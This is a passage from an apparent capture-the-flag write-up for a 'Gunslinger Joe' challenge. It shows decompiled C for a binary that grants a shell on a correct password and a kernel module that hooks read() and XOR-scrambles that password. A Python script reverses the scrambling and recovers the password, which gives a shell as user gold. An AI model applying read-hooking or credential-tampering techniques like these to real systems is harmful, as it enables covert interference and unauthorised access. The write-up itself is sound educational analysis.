</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;         _/__         ___;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;      ,~~    |  __--~~       Gunslinger Joe&#39;s&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;     &#39;        ~~| (  |       Private Stash of Gold&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;    &#39;      &#39;~~  `____&#39;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;   &#39;      &#39;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;  &#39;      `            Password Protection activated!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; &#39;       `&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;&#39;--------`&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Username: &quot;</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span><span class='line'>  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mh">0xFFuLL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Password: &quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">username</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span><span class='line'>  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="mh">0xFFuLL</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mh">0xA</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>    <span class="o">*</span><span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="mh">0xA</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="mh">0xA</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>    <span class="o">*</span><span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="mh">0xA</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span> <span class="s">&quot;Joe&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;omg_joe_is_so_rich&quot;</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Access granted!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">v3</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">v4</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">v5</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresuid</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span><span class='line'>    <span class="n">argva</span> <span class="o">=</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">v9</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span><span class='line'>    <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">argva</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Authentication failed!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mh">0x28LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v12</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<p>The expected username and password don&#8217;t work. However, they work in the
following cases:</p>

<ul>
<li>running strace</li>
<li>running gdb</li>
<li>running the binary on a local VM (Linux ubuntu 3.5.0-23-generic)</li>
<li>copying the binary and running it on the remote VM</li>
</ul>

<p>So, it&#8217;s something about running the box in its native environment that makes it
work.  We found a kernel module on the box&#8230;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">joes_gold</span><span class="err">@</span><span class="n">goldstash</span><span class="o">:~</span><span class="err">$</span> <span class="n">lsmod</span>
</span><span class='line'><span class="n">Module</span>                  <span class="n">Size</span>  <span class="n">Used</span> <span class="n">by</span>
</span><span class='line'><span class="n">nfnetlink</span>              <span class="mi">14606</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">bluetooth</span>             <span class="mi">391136</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">joe</span>                    <span class="mi">12678</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">ppdev</span>                  <span class="mi">17671</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">serio_raw</span>              <span class="mi">13462</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">i2c_piix4</span>              <span class="mi">22155</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">parport_pc</span>             <span class="mi">32701</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">lp</span>                     <span class="mi">17759</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">parport</span>                <span class="mi">42348</span>  <span class="mi">3</span> <span class="n">lp</span><span class="p">,</span><span class="n">ppdev</span><span class="p">,</span><span class="n">parport_pc</span>
</span><span class='line'><span class="n">mac_hid</span>                <span class="mi">13205</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">psmouse</span>               <span class="mi">106678</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">pcnet32</span>                <span class="mi">41545</span>  <span class="mi">0</span>
</span><span class='line'><span class="n">mii</span>                    <span class="mi">13934</span>  <span class="mi">1</span> <span class="n">pcnet32</span>
</span><span class='line'><span class="n">joes_gold</span><span class="err">@</span><span class="n">goldstash</span><span class="o">:~</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
</span><span class='line'><span class="n">Linux</span> <span class="n">goldstash</span> <span class="mf">3.13.0</span><span class="o">-</span><span class="mi">36</span><span class="o">-</span><span class="n">generic</span> <span class="err">#</span><span class="mi">63</span><span class="o">-</span><span class="n">Ubuntu</span> <span class="n">SMP</span> <span class="n">Wed</span> <span class="n">Sep</span> <span class="mi">3</span> <span class="mi">21</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="mo">07</span> <span class="n">UTC</span> <span class="mi">2014</span> <span class="n">x86_64</span> <span class="n">x86_64</span> <span class="n">x86_64</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span>
</span><span class='line'><span class="n">joes_gold</span><span class="err">@</span><span class="n">goldstash</span><span class="o">:~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="mf">3.13.0</span><span class="o">-</span><span class="mi">36</span><span class="o">-</span><span class="n">generic</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">joe</span><span class="o">/</span><span class="n">joe</span><span class="p">.</span><span class="n">ko</span>
</span><span class='line'><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="mf">3.13.0</span><span class="o">-</span><span class="mi">36</span><span class="o">-</span><span class="n">generic</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">joe</span><span class="o">/</span><span class="n">joe</span><span class="p">.</span><span class="n">ko</span>
</span><span class='line'><span class="n">joes_gold</span><span class="err">@</span><span class="n">goldstash</span><span class="o">:~</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>

<p>The joe kernel module has functions such as:</p>

<ul>
<li>joe</li>
<li>findshit</li>
<li>lolcred</li>
<li>fuqstring</li>
</ul>

<p>There are references to the password (&quot;omg<em>joe</em>is<em>so</em>rich&quot;) which appear to find
it in userland memory. It then appears to change it. The string is modified in
user input.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">joe</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// rdx@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r14@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r12@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rax@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// rbx@1</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// er13@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// rax@1</span>
</span><span class='line'>  <span class="n">bool</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// cf@1</span>
</span><span class='line'>  <span class="n">bool</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// zf@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// rsi@3</span>
</span><span class='line'>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// rcx@3</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// rdi@3</span>
</span><span class='line'>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// rsi@6</span>
</span><span class='line'>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// rax@6</span>
</span><span class='line'>  <span class="n">bool</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// zf@12</span>
</span><span class='line'>  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// rcx@13</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// rsi@13</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v20</span><span class="p">;</span> <span class="c1">// rdi@13</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">_fentry__</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v3</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
</span><span class='line'>  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v5</span><span class="p">)</span> <span class="o">=</span> <span class="n">kmem_cache_alloc_trace</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kmalloc_caches</span> <span class="o">+</span> <span class="mh">0x20000008</span><span class="p">),</span> <span class="mh">0x80D0LL</span><span class="p">,</span> <span class="mh">0x100LL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v6</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v7</span> <span class="o">=</span> <span class="p">((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">_QWORD</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">o_read</span> <span class="o">+</span> <span class="mh">0x40000000</span><span class="p">))((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span><span class='line'>  <span class="n">copy_from_user</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="mh">0xFFLL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v8</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">current_task</span> <span class="o">+</span> <span class="mh">0x4B0LL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v8</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x3E9u</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v8</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3E9</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v8</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x3E9</span> <span class="p">)</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">LABEL_2</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v12</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v13</span> <span class="o">=</span> <span class="mh">0x12LL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v14</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&quot;omg_joe_is_so_rich&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">do</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v13</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v12</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="p">;</span>
</span><span class='line'>    <span class="n">v10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v12</span><span class="o">++</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v14</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="o">--</span><span class="n">v13</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="n">v10</span> <span class="p">);</span>
</span><span class='line'>  <span class="n">v15</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v16</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="o">!</span><span class="n">v9</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">v10</span><span class="p">)</span> <span class="o">==</span> <span class="n">v9</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">v16</span><span class="p">)</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">v16</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">v16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">v15</span> <span class="o">==</span> <span class="mh">0x12</span> <span class="p">)</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">v16</span> <span class="o">=</span> <span class="n">v15</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="nl">LABEL_10:</span>
</span><span class='line'>    <span class="n">copy_to_user</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="mh">0x12LL</span><span class="p">);</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">LABEL_2</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">v16</span><span class="p">)</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">v16</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">v16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">v17</span> <span class="o">=</span> <span class="n">v15</span> <span class="o">==</span> <span class="mh">0x12</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v15</span> <span class="o">==</span> <span class="mh">0x12</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="n">v16</span> <span class="o">=</span> <span class="n">v15</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">v18</span> <span class="o">=</span> <span class="mh">0x12LL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v19</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v20</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&quot;omg_joe_is_so_rich&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="k">do</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v18</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="n">v17</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v19</span><span class="o">++</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v20</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="o">--</span><span class="n">v18</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="n">v17</span> <span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="p">)</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
</span><span class='line'><span class="nl">LABEL_2:</span>
</span><span class='line'>  <span class="n">kfree</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">v7</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<p>The fuqstring function (in-lined above) appears to do a simple modification of
the target string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">xor_key</span>         <span class="n">db</span> <span class="err">&#39;</span><span class="mi">123456789012445678</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span> <span class="n">fuqstring</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">counter</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">counter</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="n">index</span> <span class="o">=</span> <span class="n">counter</span><span class="o">++</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">buffer</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">xor_key</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">counter</span> <span class="o">==</span> <span class="mi">18</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buffer</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<p>This code gives the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="n">userdata</span> <span class="o">=</span> <span class="s">&quot;omg_joe_is_so_rich&quot;</span>
</span><span class='line'><span class="n">xorkey</span> <span class="o">=</span>   <span class="s">&quot;123456789012445678&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">userdata</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">xorkey</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">userbyte</span> <span class="ow">in</span> <span class="n">userdata</span><span class="p">:</span>
</span><span class='line'>  <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">4</span><span class="o">+</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">userbyte</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">xorkey</span><span class="p">[</span><span class="n">index</span><span class="p">])))</span>
</span><span class='line'>  <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'>
</span><span class='line'><span class="n">OUTPUT</span><span class="p">:</span>
</span><span class='line'><span class="n">bcXoc</span><span class="p">]</span><span class="n">VkTGrE_oKcXT</span>
</span></code></pre></td></tr></table></div></figure>

<p>Providing the password gives us a shell running as gold.</p>

